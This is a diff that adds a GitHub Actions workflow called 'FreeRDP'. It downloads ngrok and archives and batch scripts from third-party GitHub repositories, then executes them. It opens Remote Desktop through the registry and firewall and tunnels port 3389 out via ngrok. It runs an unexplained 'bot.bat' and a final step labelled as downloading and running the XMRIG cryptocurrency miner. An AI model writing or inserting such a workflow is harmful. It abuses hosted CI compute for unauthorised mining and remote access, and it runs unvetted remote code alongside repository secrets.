@@ -1,0 +1,45 @@
+name: FreeRDP
+on: workflow_dispatch
+jobs:
+  build:
+    runs-on: windows-latest
+    timeout-minutes: 9999
+
+    steps:
+    - name: Downloading all files
+      run: | 
+        Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
+        Invoke-WebRequest https://github.com/GitHub109750/RDP6/releases/download/1/files.zip -OutFile Files.zip
+        Invoke-WebRequest https://raw.githubusercontent.com/GitHub109750/RDP1/main/start1.bat -OutFile start1.bat
+    - name: Exstracting all files
+      run: |
+        Expand-Archive ngrok.zip
+        7z e files.zip
+    - name: Connecting to your Ngrok account.
+      run: .\ngrok\ngrok.exe authtoken $Env:NGROK_AUTH_TOKEN
+      env:
+        NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
+
+    - name: Activating RDP access.
+      run: | 
+        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+    
+    - name: Creating IP.
+      run: Start-Process Powershell -ArgumentList '-Noexit -Command ".\ngrok\ngrok.exe tcp 3389"'
+
+    - name: Name RDP Owner
+      run: echo Rohan_uwu
+
+    - name: Connecting to your RDP.
+      run: cmd /c start.bat
+
+    - name: Getting IP For Porting it on the bot
+      run: cmd /c start1.bat
+
+    - name: starting bot
+      run: cmd /c bot.bat
+
+    - name: Downloading XMRIG/running/started
+      run: .\loop.ps1
